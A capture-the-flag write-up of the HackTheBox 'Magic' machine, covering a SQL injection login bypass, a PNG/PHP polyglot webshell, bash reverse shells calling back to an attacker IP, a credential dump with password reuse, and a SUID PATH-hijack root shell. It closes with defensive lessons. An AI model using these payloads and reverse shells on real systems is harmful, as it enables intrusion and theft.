---
title: "Magic"
date: 2020-05-30
type: docs
tags:
  - htb
  - linux
  - medium
  - sqli
  - auth-bypass
  - file-upload
  - polyglot
  - magic-bytes
  - mysql
  - port-forward
  - suid
  - popen
  - path-hijack
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 18.04), **Difficulty:** Medium, **Released:** 2020-05-30, **IP:** `10.10.10.185` , `magic.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Login form is **SQL injectable**. `admin' #` in both fields bypasses authentication.
2. The image upload validates **magic bytes only**, not extension. Upload a **PNG/PHP polyglot** named `x.php.png` with `<?php system($_GET['cmd']); ?>` after the PNG header. RCE as `www-data`.
3. `db.php5` leaks `theseus : iamkingtheseus` (DB). `www-data` has no `mysql` client, so port forward `3306` and connect from your box. The `login` table has `admin : Th3s3usW4sK1ng`, which is also `theseus`'s system password. `su theseus`.
4. The SUID root binary `/bin/sysinfo` calls `fdisk`, `lshw`, `free` and others through `popen()` **without absolute paths**. Prepend a writable dir to `PATH`, drop a fake `fdisk`, run `sysinfo`. Root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| `db.php5` (DB) | `theseus : iamkingtheseus` |
| `login` table, reused for `su theseus` | `Th3s3usW4sK1ng` |
| `user.txt` | `/home/theseus/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Magic is an older HackTheBox machine, but going back through it reminded me why some techniques stay relevant for decades: this box teaches three of them extremely well. The first is a classic SQL injection authentication bypass using the comment trick, where feeding `admin' #` into the login form turns the backend query `WHERE user='admin' # ' AND pass='...'` into effectively just `WHERE user='admin'`, since everything after the `#` gets commented out and never evaluated. The second is an upload filter bypass built around a polyglot file, exploiting the fact that the server only verifies the PNG magic bytes at the start of the upload rather than actually re-encoding or fully validating it, so a file that is simultaneously a legitimate PNG and legitimate PHP sails straight through and executes. The third is a SUID `popen()` PATH hijack, where a setuid binary shells out to helper utilities by name instead of by absolute path, which means whoever controls `PATH` controls which binary actually runs.

I found it useful to compare this against a few other boxes as I worked through it. For a NoSQL flavor of the same authentication bypass logic, see [Stocker](/writeups/hackthebox/linux/easy/stocker/). For more upload filter bypass techniques, [PopCorn](/writeups/hackthebox/linux/medium/popcorn/), [Usage](/writeups/hackthebox/linux/easy/usage/), and [Nexus](/writeups/hackthebox/linux/easy/nexus/) each take a slightly different angle. And for more SUID PATH hijacking, [Previse](/writeups/hackthebox/linux/easy/previse/), [Headless](/writeups/hackthebox/linux/medium/headless/), and [Lookup](/writeups/tryhackme/linux/easy/lookup/) are worth reading alongside this one.

---

## Full Walkthrough

### Recon

```console
Open 10.10.10.185:22
Open 10.10.10.185:80
```

Browsing to the web application, I found a login form waiting for me. Given how old this box is and how common comment-based SQL injection was in that era, I tried the classic `admin' #` payload in both the username and password fields, and it walked me straight past authentication.

While reviewing the page source, I also noticed a stray hex string embedded in the HTML, `4d61676963`, which decodes to the ASCII string "magic". It never ended up factoring into the actual attack path, but I made a note of it anyway, since at this stage of an assessment a red herring and a genuine lead look identical until you've chased both down.

I also ran `dirsearch` against the site to map out what else was reachable, and it turned up `/upload.php`, which redirected to `login.php` for unauthenticated requests, along with a handful of standard `.shtml` error pages that didn't lead anywhere interesting on their own.

<div class="callout callout-note">

**Why `admin' #` works**

Working through why this payload succeeds: the backend query is almost certainly something like `SELECT * FROM login WHERE username='$u' AND password='$p'`, built by directly concatenating user input into the SQL string. Setting `$u` to `admin' #` reshapes that into `... WHERE username='admin' #' AND password='...'`, and since `#` starts a MySQL comment, everything from that point to the end of the line is discarded before the query even runs. What's left is a query that only ever checks the username, which means any password value satisfies it. I also confirmed `' or 1=1 -- -` works just as well, which is the more general form of the same weakness. The real fix here isn't input filtering, it's parameterized queries: had the application used a prepared statement with bound parameters, string concatenation like this would never have been possible in the first place.

</div>

### Foothold, PNG/PHP polyglot upload

With the login bypassed, I found an image upload feature and immediately started testing what the server would actually accept. A Metasploit reverse shell module got flagged and rejected, and pentestmonkey's well-known PHP reverse shell met the same fate, so it was clear something was inspecting file contents rather than trusting extensions blindly. My next move was to build a polyglot: I took a PNG of Rick Astley, inserted `<?php system($_GET['cmd']); ?>` into the middle of the file, and saved the result as `rick2.php.png`. Uploading that got past the filter cleanly, and browsing to it confirmed code execution:

```
http://10.10.10.185/images/uploads/rick2.php.png?cmd=id
```

Command execution through a GET parameter is a good start, but I wanted an interactive shell, so I followed up with a URL-encoded bash reverse shell through the same parameter:

```
http://10.10.10.185/images/uploads/rick2.php.png?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.25/9001+0>%261'
```

<div class="callout callout-note">

**Polyglot upload bypass**

Breaking down why this worked: the upload handler validates files by calling `getimagesize()` or checking that the first bytes match the PNG magic number `\x89PNG`, but it never checks the actual file extension and never re-encodes the image into a clean copy. On the Apache side, a permissive `AddHandler`/`SetHandler` configuration (or simply `.php` appearing anywhere in a multi-extension filename) means `rick2.php.png` gets executed as PHP purely because `.php` shows up in the name, regardless of what comes after it. Put those two facts together and a file that is simultaneously a structurally valid PNG and syntactically valid PHP sails through validation and then executes as a script. The trick to keeping the PNG valid while embedding PHP is placing the payload after the `IEND` chunk, or tucking it inside a PNG comment chunk, so the image parser never even reaches the injected code.

</div>

### www-data to theseus

```php
// db.php5
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
```

That snippet of `db.php5` handed me a database credential pair for a user called `theseus`, so naturally I wanted to see what was actually in that database. The problem was that `www-data` on the target had no `mysql` client binary installed, so rather than fight with a static binary upload, I used a Meterpreter session to set up a port forward and connected to the database directly from my own attack box instead:

```console
meterpreter > portfwd add -l 3306 -p 3306 -r 127.0.0.1
```

With port 3306 forwarded back to me, querying the database was no different than connecting to any local MySQL instance:

```console
$ mysql -u theseus -piamkingtheseus -h 127.0.0.1 Magic -e 'select * from login'
+----+----------+----------------+
| id | username | password       |
+----+----------+----------------+
|  1 | admin    | Th3s3usW4sK1ng |
+----+----------+----------------+
```

The `login` table gave up an `admin` credential, and on a hunch I tried it against `theseus`'s own system account, since password reuse between an application and its host user is an extremely common pattern on these boxes. It worked:

```console
www-data@ubuntu:/tmp$ su theseus
Password: Th3s3usW4sK1ng
theseus@ubuntu:/tmp$
```

### Privilege Escalation, SUID sysinfo PATH hijack

```console
theseus@ubuntu:~$ ls -l /bin/sysinfo
-rwsr-x--- 1 root users 22040 Oct 21 2019 /bin/sysinfo
```

The permission bits showed `/bin/sysinfo` was SUID root and executable by the `users` group, and checking my own group membership confirmed `theseus` was a member, so I was allowed to run it. Rather than guess at what the binary did internally, I traced its actual system calls with `ltrace`, which showed it shelling out to several system utilities through `popen()`:

```console
popen("fdisk -l", "r")
popen("lshw -short", "r")
popen("free -h", "r")
popen("cat /proc/cpuinfo", "r")
```

<div class="callout callout-note">

**SUID + `popen` + relative name = root**

Here's the mechanism I was exploiting: `popen("fdisk -l", "r")` under the hood runs `/bin/sh -c "fdisk -l"`, and a shell invoked that way resolves the `fdisk` command by searching `PATH` rather than calling a fixed binary location. Because `sysinfo` runs SUID root and never sanitizes `PATH` or hardcodes absolute paths for the tools it shells out to, I could simply prepend a directory I control to `PATH` and drop my own executable named `fdisk` into it. When `sysinfo` ran, it found my fake binary first and executed it as root:
```bash
cd /dev/shm
printf '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.25/9002 0>&1\n' > fdisk
chmod +x fdisk
export PATH=/dev/shm:$PATH
/bin/sysinfo        # runs our fdisk as root
```
My listener caught the connection and I had a root shell. A quieter alternative I considered was having the fake `fdisk` simply run `chmod u+s /bin/bash` instead of popping a shell directly, leaving a SUID bash binary behind for later use rather than an active reverse connection.

</div>

With root confirmed, I grabbed both flags and closed out the box.

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/theseus/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **Parameterize every query, full stop.** The comment-based authentication bypass I used here is over two decades old and it still works on real applications today. Prepared statements with bound parameters eliminate this entire class of bug, and there's no good reason for new code to concatenate user input into SQL strings.
- **Validate uploads by actually re-encoding the file, not by checking magic bytes.** A magic byte check tells you the file starts with the right header, it tells you nothing about what comes after it. Decoding an uploaded image and re-encoding it into a fresh file strips out anything appended or hidden inside, which a naive header check will always miss. Uploaded files should also live outside the web root, or in a location with script execution explicitly disabled, and should be renamed to a single safe extension the server controls.
- **Never let a web server execute multi-extension files as a scripting language.** The Apache configuration that ran `rick2.php.png` as PHP because `.php` appeared anywhere in the filename is the root enabler of the whole upload bypass. A file named `x.php.png` should be served as an image, or not served at all if the extension looks suspicious.
- **SUID binaries must use absolute paths for every external command they invoke**, and should sanitize or reset their environment before doing anything privileged. Any setuid program that calls `popen()`, `system()`, or one of the `exec*p()` family functions by relying on `PATH` resolution is a serious red flag, because it hands PATH control, and therefore code execution, to whoever can influence the calling user's environment.
- **Group membership is itself a privilege boundary, and it's easy to overlook.** `theseus` could run the vulnerable `sysinfo` binary purely because of `users` group membership, which is a good reminder to audit who belongs to which groups and what those groups can actually touch, not just who has explicit sudo rights.

---

## Related Writeups

- **SQLi / NoSQLi auth bypass:** [Stocker](/writeups/hackthebox/linux/easy/stocker/)
- **Upload filter bypass (polyglot, extension, content type):** [PopCorn](/writeups/hackthebox/linux/medium/popcorn/), [Usage](/writeups/hackthebox/linux/easy/usage/), [Nexus](/writeups/hackthebox/linux/easy/nexus/)
- **SUID PATH hijack / relative binary:** [Previse](/writeups/hackthebox/linux/easy/previse/), [Headless](/writeups/hackthebox/linux/medium/headless/), [Lookup](/writeups/tryhackme/linux/easy/lookup/), [Plotted-TMS-v3](/writeups/tryhackme/linux/easy/plotted-tms-v3/)
- **Config file DB creds then password reuse:** [Previse](/writeups/hackthebox/linux/easy/previse/), [Stocker](/writeups/hackthebox/linux/easy/stocker/)

## References

- OWASP SQL Injection <https://owasp.org/www-community/attacks/SQL_Injection>
- Polyglot file uploads <https://github.com/Polydet/polyglot-database>
- GTFOBins on PATH abuse <https://gtfobins.github.io/>
